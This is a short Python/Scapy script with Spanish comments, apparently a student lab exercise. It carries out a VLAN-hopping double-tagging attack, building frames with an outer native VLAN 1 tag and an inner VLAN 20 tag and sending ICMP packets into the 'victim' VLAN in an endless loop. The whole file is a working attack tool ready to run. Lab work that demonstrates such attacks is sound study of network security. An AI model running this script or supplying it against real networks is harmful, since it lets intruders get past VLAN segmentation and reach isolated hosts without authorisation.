#!/usr/bin/env python3
# ============================================================
# DTP VLAN Hopping - Double Tagging Attack
# Autor: Yeury Lopez | Matricula: 2025-0780
# Descripcion: Salta a VLAN 20 desde VLAN 10 via double tag
# Requisitos: pip3 install scapy
# Uso: sudo python3 dtp_attack.py
# ============================================================

from scapy.all import *
import time

IFACE      = "eth0"
SRC_MAC    = get_if_hwaddr(IFACE)
DST_MAC    = "ff:ff:ff:ff:ff:ff"
VLAN_OUTER = 1    # VLAN nativa del trunk (outer tag)
VLAN_INNER = 20   # VLAN victima (inner tag)
SRC_IP     = "172.20.25.100"
DST_IP     = "172.7.80.100"

def attack():
    print("=" * 55)
    print("  DTP VLAN Hopping | Yeury Lopez | 2025-0780")
    print("=" * 55)
    print(f"  Interfaz  : {IFACE}")
    print(f"  MAC       : {SRC_MAC}")
    print(f"  VLAN outer: {VLAN_OUTER} (nativa)")
    print(f"  VLAN inner: {VLAN_INNER} (victima)")
    print(f"  Destino   : {DST_IP}")
    print("=" * 55)
    print("\n[*] Enviando paquetes double-tagged...")
    print("[*] Presiona Ctrl+C para detener\n")

    pkt = (
        Ether(src=SRC_MAC, dst=DST_MAC) /
        Dot1Q(vlan=VLAN_OUTER) /
        Dot1Q(vlan=VLAN_INNER) /
        IP(src=SRC_IP, dst=DST_IP) /
        ICMP()
    )

    count = 0
    while True:
        sendp(pkt, iface=IFACE, verbose=False)
        count += 1
        print(f"[+] Paquete enviado #{count} | {SRC_IP} -> {DST_IP} via VLAN {VLAN_INNER}", end='\r')
        time.sleep(1)

if __name__ == "__main__":
    try:
        attack()
    except KeyboardInterrupt:
        print(f"\n[*] Ataque detenido")
        print("=" * 55)
